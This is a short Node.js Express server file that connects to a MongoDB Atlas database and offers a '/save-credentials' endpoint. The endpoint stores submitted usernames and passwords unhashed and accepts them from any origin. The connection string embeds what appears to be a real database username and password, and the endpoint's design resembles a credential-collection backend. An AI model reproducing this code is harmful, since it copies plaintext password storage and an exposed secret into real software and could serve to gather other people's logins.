const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors'); // Import CORS middleware

const app = express();
const port = 3000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());
app.use(cors()); // Use CORS middleware to allow all origins during development

// Connect to MongoDB Atlas
mongoose.connect('mongodb+srv://sahilgautam0097:HHjSAiTuKGV92AsC@cluster0.omracpe.mongodb.net/gameDB', {
    useNewUrlParser: true,
    useUnifiedTopology: true
})
.then(() => {
    console.log('Connected to MongoDB Atlas');
})
.catch((err) => {
    console.error('Error connecting to MongoDB Atlas:', err);
});

// Define a schema for the data
const credentialsSchema = new mongoose.Schema({
    username: String,
    password: String
});

// Create a model based on the schema
const Credentials = mongoose.model('Credentials', credentialsSchema);

// API endpoint to save credentials
app.post('/save-credentials', (req, res) => {
    console.log('Received POST request to save credentials');

    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).send('Username and password are required.');
    }

    const newCredentials = new Credentials({ username, password });
    newCredentials.save()
    .then(() => {
        res.status(200).send('Credentials saved successfully');
    })
    .catch((err) => {
        console.error('Error saving credentials:', err);
        res.status(500).send('Error saving credentials');
    });
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
